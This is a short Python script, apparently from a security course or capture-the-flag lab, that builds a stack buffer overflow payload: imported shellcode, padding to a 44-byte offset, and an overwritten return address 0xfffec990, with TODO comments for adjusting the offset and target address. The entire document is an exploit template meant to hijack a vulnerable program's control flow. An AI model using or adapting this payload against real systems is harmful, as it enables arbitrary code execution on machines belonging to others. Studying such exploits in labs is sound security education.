import struct
import sys
from shellcode import shellcode

# TODO: Fix the number 44 to be the same as the different on your end
remaining = 44 - len(shellcode)
# TODO: Fix the target address to be the one you will use for the shellcode
sys.stdout.buffer.write(shellcode + b"a"*remaining + struct.pack("<I", 0xfffec990))